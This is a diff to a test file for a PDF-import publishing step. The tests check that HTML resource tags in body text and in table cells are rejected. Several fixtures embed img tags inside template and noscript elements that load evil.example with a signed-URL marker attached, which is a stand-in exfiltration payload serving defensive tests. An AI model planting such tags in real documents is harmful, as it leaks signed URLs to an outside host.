@@ -1083,7 +1083,7 @@ test("pdf-import prunedResult 未知字段计入 dropped 并不持久化", async
   await expectProjectDoesNotContain(SIGNED_URL_MARKER);
 });
 
-test("pdf-import 非表格正文的 template/noscript/script/style 资源整体拒绝发布", async () => {
+test("pdf-import 正文与表格的 template/noscript/script/style 资源整体拒绝发布", async () => {
   const unsafe = [
     `<template><img src="https://evil.example/x.png?${SIGNED_URL_MARKER}"></template>`,
     `<noscript><img src="https://evil.example/x.png?${SIGNED_URL_MARKER}"></noscript>`,
@@ -1097,6 +1097,21 @@ test("pdf-import 非表格正文的 template/noscript/script/style 资源整体�
   const result = await publishParseSnapshot({ root, task: fixture.task, response: fixture.response });
   expect(result.ok).toBe(false);
   if (result.ok) throw new Error("unsafe block was accepted");
+  expect(result.diagnostic.code).toBe("parse-resource-url-rejected");
+  expect(await parseSnapshots()).toEqual([]);
+  await expectProjectDoesNotContain(SIGNED_URL_MARKER);
+});
+
+test("pdf-import 表格单元格内 template 资源同样拒绝发布，签名不进入快照", async () => {
+  const fixture = await downloadResponse(() => jsonl([row([
+    vendorPage([block(0,
+      `<table><tr><td><template><img src="https://evil.example/x.png?${SIGNED_URL_MARKER}"></template>safe</td></tr></table>`,
+      { block_label: "table" })]),
+    vendorPage([block(0, "Second page text")]),
+  ])]));
+  const result = await publishParseSnapshot({ root, task: fixture.task, response: fixture.response });
+  expect(result.ok).toBe(false);
+  if (result.ok) throw new Error("table template resource was accepted");
   expect(result.diagnostic.code).toBe("parse-resource-url-rejected");
   expect(await parseSnapshots()).toEqual([]);
   await expectProjectDoesNotContain(SIGNED_URL_MARKER);
